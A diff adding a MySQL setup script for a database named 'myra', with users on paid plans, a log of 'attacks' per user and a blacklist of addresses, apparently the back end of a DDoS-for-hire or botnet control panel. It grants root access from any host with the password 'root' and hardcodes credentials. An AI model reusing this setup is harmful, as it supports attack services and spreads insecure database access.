@@ -1,0 +1,33 @@
+use mysql
+GRANT ALL ON *.* to root@'%' IDENTIFIED BY 'root';
+FLUSH PRIVILEGES;
+
+create database myra;
+use myra;
+
+CREATE TABLE `users` (
+    `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+    `username` varchar(32),
+    `password` varchar(32),
+    `plan` TEXT,
+    `expirydate` TEXT,
+    PRIMARY KEY (`id`),
+    KEY `username` (`username`)
+);
+
+CREATE TABLE `attacks` (
+    `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+    `attack` TEXT,
+    `user` TEXT,
+    PRIMARY KEY (`id`)
+);
+
+CREATE TABLE `blacklisted` (
+    `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+    `address` TEXT,
+    PRIMARY KEY (`id`)
+);
+
+UPDATE mysql.user SET Password=PASSWORD('SERDOKILGJ') WHERE User='root';
+INSERT INTO users VALUES ('0', 'root', 'TT\\Z[RTYVYUU[V[QR]]^', 'admin', '30/12/2020');
+exit;
